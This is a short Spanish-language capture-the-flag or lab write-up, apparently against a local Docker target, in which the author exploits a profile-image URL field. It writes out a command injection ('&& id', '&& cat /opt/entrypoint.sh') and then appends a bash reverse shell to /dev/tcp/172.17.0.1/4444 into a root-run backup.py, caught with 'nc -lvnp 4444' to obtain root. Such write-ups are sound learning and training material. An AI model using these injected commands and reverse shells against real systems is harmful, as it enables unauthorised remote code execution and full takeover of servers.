## Reconocimiento:

Puerto 8000 : HTTP

En la web me creo un usuario y accedo a un panel con una opción subir una imagen de perfil mediante un servidor. Así que me monto uno con Python:

```bash
python3 -m http.server 
```

Luego inserto la URL con cualquier archivo ya que no sanitiza bien los paramentos y deja subir cualquier archivo. Intento una rev shell con php pero no deja, así que pruebo concatenando comandos. 

```bash
http://172.17.0.1:8000/archivo_random && id
```

Se puede, confirmando así un RCE. 

De primeras pruebo una rev shell en bash pero no tengo éxito, así que me pongo a explorar el servidor desde la web. Hay varios archivos que revelan credenciales, pero como no hay servicio SSH descarto eso. Investigando mas, hay un archivo interesante llamado “entrypoint.sh”

```bash
http://172.17.0.1:8000/archivo_random && cat /opt/entrypoint.sh
```

Dentro veo que hay un archivo [backup.py](http://backup.py) que se puede modificar y se esta corriendo como root. Decido inyectarle una rev shell:

```bash
http://172.17.0.1:8000/archivo_random && echo '\nimport os; os.system("/bin/bash -c '\''/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'\''")' >> /opt/backup.py &&
```

Me pongo a la escucha:

```bash
nc -lvnp 4444
```

Espero unos 60 segundos y listo, no hay escalada ya que la rev shell tiene privilegios root.
